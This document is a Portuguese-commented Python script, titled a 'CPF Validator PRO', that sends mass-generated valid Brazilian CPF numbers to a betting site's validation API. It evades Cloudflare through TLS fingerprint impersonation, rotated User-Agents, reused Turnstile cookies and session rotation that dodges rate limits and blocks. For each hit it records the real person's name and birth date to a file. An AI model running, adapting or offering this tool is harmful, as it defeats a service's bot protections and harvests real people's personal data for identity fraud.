#!/usr/bin/env python3
"""
CPF Validator PRO - Bypass Completo do Cloudflare
==================================================
Combina:
1. curl_cffi para TLS fingerprint impersonation
2. Cookies do Turnstile solver (se disponíveis)
3. Rotação de sessões para evitar rate limit
4. Delay inteligente adaptativo

Instalar: pip install curl_cffi
"""
import random
import time
import json
import os
from datetime import datetime
from typing import Optional, Dict, List

try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False
    import requests as curl_requests

# Configurações OTIMIZADAS (baseado nos testes)
MAX_REQUESTS_PER_SESSION = 8   # Limite antes de criar nova sessão (rate limit em ~10)
DELAY_MIN = 0.3                # Delay mínimo (testado: funciona até 0.1s)
DELAY_MAX = 0.5                # Delay máximo
PROXY_CONFIG = None  # Será configurado se disponível

# Lista de User-Agents para rotação
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# Impersonações disponíveis no curl_cffi
IMPERSONATIONS = ["chrome120", "chrome119", "chrome110", "edge101", "safari15_5"]


class CPFGenerator:
    """Gerador de CPF com validação matemática"""
    
    @staticmethod
    def gerar():
        cpf = [random.randint(0, 9) for _ in range(9)]
        
        # Primeiro dígito verificador
        soma = sum((10 - i) * cpf[i] for i in range(9))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        
        # Segundo dígito verificador
        soma = sum((11 - i) * cpf[i] for i in range(10))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        
        return ''.join(map(str, cpf))
    
    @staticmethod
    def formatar(cpf):
        return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"


class SessionManager:
    """Gerenciador de sessões com rotação automática"""
    
    def __init__(self):
        self.request_count = 0
        self.session = None
        self.current_impersonation = None
        self._criar_nova_sessao()
    
    def _criar_nova_sessao(self):
        """Cria uma nova sessão com fingerprint aleatório"""
        if CURL_CFFI_AVAILABLE:
            self.current_impersonation = random.choice(IMPERSONATIONS)
            self.session = curl_requests.Session(impersonate=self.current_impersonation)
        else:
            self.session = curl_requests.Session()
            self.session.headers.update({
                "User-Agent": random.choice(USER_AGENTS)
            })
        
        self.request_count = 0
        
        # Tenta carregar cookies salvos
        self._carregar_cookies_salvos()
    
    def _carregar_cookies_salvos(self):
        """Carrega cookies do cloudflare_token.json ou turnstile_token.json"""
        for arquivo in ["cloudflare_token.json", "turnstile_token.json"]:
            try:
                if os.path.exists(arquivo):
                    with open(arquivo, "r") as f:
                        data = json.load(f)
                        if isinstance(data, list) and len(data) > 0:
                            entry = data[-1]  # Último token
                            cookies = entry.get("cookies", [])
                            for cookie in cookies:
                                if isinstance(cookie, dict):
                                    self.session.cookies.set(
                                        cookie.get("name", ""),
                                        cookie.get("value", ""),
                                        domain=cookie.get("domain", "7k.bet.br")
                                    )
                            return True
            except:
                pass
        return False
    
    def get_session(self):
        """Retorna sessão, rotacionando se necessário"""
        if self.request_count >= MAX_REQUESTS_PER_SESSION:
            print(f"\n   🔄 Rotacionando sessão (limite de {MAX_REQUESTS_PER_SESSION} req atingido)...")
            self._criar_nova_sessao()
            time.sleep(2)  # Pausa entre sessões
        
        self.request_count += 1
        return self.session
    
    def force_rotate(self):
        """Força rotação de sessão"""
        print(f"\n   🔄 Forçando nova sessão...")
        self._criar_nova_sessao()
        time.sleep(3)


class CPFValidatorPro:
    """Validador de CPF com bypass de Cloudflare"""
    
    def __init__(self):
        self.session_manager = SessionManager()
        self.resultados = {
            "validos": [],
            "invalidos": 0,
            "bloqueados": 0,
            "erros": 0,
            "sessoes_rotacionadas": 0
        }
        self.delay_atual = DELAY_MIN
        self.bloqueios_consecutivos = 0
    
    def _get_headers(self):
        return {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://7k.bet.br",
            "Referer": "https://7k.bet.br/",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
    
    def validar_cpf(self, cpf: str) -> Dict:
        """Valida um CPF na API"""
        session = self.session_manager.get_session()
        url = "https://7k.bet.br/api/documents/validate"
        
        try:
            response = session.post(
                url,
                json={"number": cpf, "type": "cpf"},
                headers=self._get_headers(),
                timeout=15
            )
            
            return {
                "status_code": response.status_code,
                "response": response.text
            }
        except Exception as e:
            return {"status_code": -1, "error": str(e)}
    
    def processar_resultado(self, cpf: str, cpf_formatado: str, resultado: Dict) -> bool:
        """Processa resultado e retorna True se deve continuar"""
        status = resultado.get("status_code")
        response_text = resultado.get("response", "")
        
        if status == 200:
            try:
                data = json.loads(response_text)
                nome = data.get("data", {}).get("name", "N/A")
                nascimento = data.get("data", {}).get("birth_date", "N/A")
                print(f"✅ VÁLIDO! {nome} ({nascimento})")
                self.resultados["validos"].append({
                    "cpf": cpf_formatado,
                    "nome": nome,
                    "nascimento": nascimento
                })
            except:
                print(f"✅ VÁLIDO!")
            
            self.delay_atual = DELAY_MIN
            self.bloqueios_consecutivos = 0
            return True
            
        elif status == 400:
            print(f"❌ Não existe")
            self.resultados["invalidos"] += 1
            self.delay_atual = DELAY_MIN
            self.bloqueios_consecutivos = 0
            return True
            
        elif status == 429:
            print(f"⏳ RATE LIMIT!")
            self.resultados["bloqueados"] += 1
            self.bloqueios_consecutivos += 1
            
            if self.bloqueios_consecutivos >= 2:
                self.session_manager.force_rotate()
                self.resultados["sessoes_rotacionadas"] += 1
                self.bloqueios_consecutivos = 0
            
            self.delay_atual = min(self.delay_atual * 1.5, 10)
            return self.bloqueios_consecutivos < 5
            
        elif status == 403:
            print(f"🚫 BLOQUEADO!")
            self.resultados["bloqueados"] += 1
            self.session_manager.force_rotate()
            self.resultados["sessoes_rotacionadas"] += 1
            return True
            
        elif status == -1:
            print(f"💥 Erro: {resultado.get('error', 'Unknown')[:30]}")
            self.resultados["erros"] += 1
            return True
            
        else:
            print(f"❓ Status {status}")
            self.resultados["erros"] += 1
            return True
    
    def run(self, max_tentativas: int = 50):
        """Executa o validador"""
        print("=" * 70)
        print("🔍 CPF Validator PRO - Bypass Cloudflare")
        print("=" * 70)
        
        if CURL_CFFI_AVAILABLE:
            print(f"✅ curl_cffi disponível")
            print(f"   Impersonação: {self.session_manager.current_impersonation}")
        else:
            print("⚠️  curl_cffi não disponível")
        
        print(f"\n📋 Configurações:")
        print(f"   Max requisições por sessão: {MAX_REQUESTS_PER_SESSION}")
        print(f"   Delay: {DELAY_MIN}-{DELAY_MAX}s")
        print(f"   Max tentativas: {max_tentativas}")
        
        print("\n" + "=" * 70)
        print("🔄 Iniciando testes...")
        print("=" * 70)
        
        for i in range(1, max_tentativas + 1):
            cpf = CPFGenerator.gerar()
            cpf_fmt = CPFGenerator.formatar(cpf)
            
            print(f"\n[{i:3d}] {cpf_fmt} ", end="")
            
            resultado = self.validar_cpf(cpf)
            
            if not self.processar_resultado(cpf, cpf_fmt, resultado):
                print("\n🛑 Muitos bloqueios consecutivos. Parando.")
                break
            
            # Delay adaptativo com jitter
            delay = self.delay_atual + random.uniform(0, DELAY_MAX - DELAY_MIN)
            time.sleep(delay)
        
        self._print_resumo()
    
    def _print_resumo(self):
        """Imprime resumo final"""
        print("\n" + "=" * 70)
        print("📊 RESUMO FINAL")
        print("=" * 70)
        
        total = (len(self.resultados["validos"]) + 
                 self.resultados["invalidos"] + 
                 self.resultados["bloqueados"] + 
                 self.resultados["erros"])
        
        print(f"Total de tentativas: {total}")
        print(f"✅ CPFs válidos: {len(self.resultados['validos'])}")
        print(f"❌ CPFs inválidos: {self.resultados['invalidos']}")
        print(f"⏳ Bloqueios: {self.resultados['bloqueados']}")
        print(f"💥 Erros: {self.resultados['erros']}")
        print(f"🔄 Sessões rotacionadas: {self.resultados['sessoes_rotacionadas']}")
        
        if self.resultados["validos"]:
            print("\n" + "-" * 40)
            print("✅ CPFs VÁLIDOS ENCONTRADOS:")
            for r in self.resultados["validos"]:
                print(f"   {r['cpf']} - {r['nome']} ({r['nascimento']})")
        
        # Salva resultados
        with open("cpf_resultados_pro.json", "w", encoding="utf-8") as f:
            json.dump({
                "timestamp": datetime.now().isoformat(),
                "resultados": self.resultados
            }, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 Salvo em cpf_resultados_pro.json")
        print("=" * 70)


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="CPF Validator PRO")
    parser.add_argument("-n", "--num", type=int, default=50, help="Número de tentativas")
    args = parser.parse_args()
    
    validator = CPFValidatorPro()
    validator.run(max_tentativas=args.num)

